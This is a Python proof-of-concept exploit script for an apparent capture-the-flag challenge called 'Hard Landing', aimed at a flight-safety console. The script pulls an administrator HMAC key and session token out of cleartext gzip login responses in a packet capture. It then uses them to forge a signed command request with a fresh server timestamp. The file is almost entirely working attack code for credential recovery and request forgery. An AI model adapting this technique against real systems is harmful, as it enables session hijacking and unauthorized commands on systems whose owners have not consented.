#!/usr/bin/env python3
"""Hard Landing — Sentinel flight-safety console session hijack / HMAC forge PoC.

Recovers the administrator HMAC key and session token from the incident
capture (cleartext HTTP login response, gzip body), then forges the
documented safe recovery command with a fresh server timestamp.

Usage: python3 hard_landing.py [base_url] [--recover <console.pcapng>]

Secrets are supplied via environment (or recovered via --recover):
  CONSOLE_KEY     — 64-char lowercase hex HMAC key from the login response
  CONSOLE_SESSION — administrator session token from the login response

Note: the CTF instance is retired; this PoC documents the exploit path.
"""
import hashlib
import hmac
import json
import os
import re
import sys
import zlib

import requests

LOGIN_RE = re.compile(r'\{[^{}]*"session"\s*:\s*"[^"]+"[^{}]*"key"\s*:\s*"[0-9a-f]{64}"[^{}]*\}')


def recover_from_pcap(path):
    """Scan a pcap(ng) for gzip-compressed HTTP bodies and pull the login JSON."""
    data = open(path, "rb").read()
    for m in re.finditer(rb"\x1f\x8b", data):
        try:
            out = zlib.decompress(data[m.start():], 31)
        except zlib.error:
            continue
        match = LOGIN_RE.search(out.decode(errors="replace"))
        if match:
            login = json.loads(match.group(0))
            return login.get("session"), login.get("key")
    return None, None


def sign(key_hex, timestamp, body):
    key = bytes.fromhex(key_hex)  # 32 raw bytes from the 64-char hex string
    msg = f"POST\n/api/command\n{timestamp}\n{body}".encode()
    return hmac.new(key, msg, hashlib.sha256).hexdigest()


def main():
    base = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else "http://<instance>"
    key = os.environ.get("CONSOLE_KEY")
    session = os.environ.get("CONSOLE_SESSION")

    if "--recover" in sys.argv:
        pcap = sys.argv[sys.argv.index("--recover") + 1]
        rec_session, rec_key = recover_from_pcap(pcap)
        if rec_key:
            key, session = rec_key, rec_session
            print("Recovered session and HMAC key from", pcap)
        else:
            print("No cleartext gzip login response found in", pcap)

    if not key or not session:
        sys.exit("Set CONSOLE_KEY and CONSOLE_SESSION (env), or pass --recover <console.pcapng>.")

    # Unauthenticated status endpoint discloses server_time, freshness window and required body.
    status = requests.get(base + "/api/status", timeout=15).json()
    print("state:", status.get("state"), "| server_time:", status.get("server_time"))
    ts = str(status["server_time"])
    body = (status.get("request") or {}).get("body") or '{"cmd":"RETURN_TO_PAD","pad":"A1"}'

    sig = sign(key, ts, body)
    resp = requests.post(
        base + "/api/command",
        data=body.encode(),
        headers={
            "Content-Type": "application/json",
            "X-Session": session,
            "X-Timestamp": ts,
            "X-Signature": sig,
            "User-Agent": "sentinel-workstation/1.0",
        },
        timeout=15,
    )
    print(resp.status_code, resp.text)


if __name__ == "__main__":
    main()
